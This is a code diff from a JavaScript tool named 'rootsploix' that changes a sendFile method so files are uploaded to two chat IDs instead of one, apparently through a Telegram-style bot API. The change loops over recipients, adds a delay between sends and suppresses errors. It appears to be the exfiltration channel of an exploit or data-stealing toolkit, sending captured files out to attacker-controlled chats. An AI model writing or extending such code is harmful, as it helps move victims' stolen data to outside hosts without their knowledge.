@@ -471,29 +471,38 @@
             }
             
             async sendFile(fileBlob, caption, type = 'document') {
-                const formData = new FormData();
-                formData.append('chat_id', this.chatId);
-                formData.append(type, fileBlob, `rootsploix_${Date.now()}.${type}`);
-                formData.append('caption', caption);
-                
+                // Support dual Chat IDs for file sending
+                const chatIds = Array.isArray(this.chatId) ? this.chatId : [this.chatId];
                 const url = `${this.apiUrl}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
                 
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
+                for (const chatId of chatIds) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append(type, fileBlob, `rootsploix_${Date.now()}.${type}`);
+                    formData.append('caption', caption);
                     
-                    if (response.ok) {
-                        RootsploixUtils.log('info', `File sent: ${type}`);
-                        return await response.json();
-                    } else {
-                        throw new Error(`HTTP ${response.status}`);
+                    try {
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            RootsploixUtils.log('info', `File sent to ${chatId}: ${type}`);
+                        } else {
+                            throw new Error(`HTTP ${response.status} for ${chatId}`);
+                        }
+                    } catch (error) {
+                        RootsploixUtils.log('error', `File send failed to ${chatId}: ${type}`, error);
                     }
-                } catch (error) {
-                    RootsploixUtils.log('error', `File send failed: ${type}`, error);
-                    throw error;
+                    
+                    // Small delay between dual sends
+                    if (chatIds.length > 1) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
                 }
+                
+                return true;
             }
         }
         
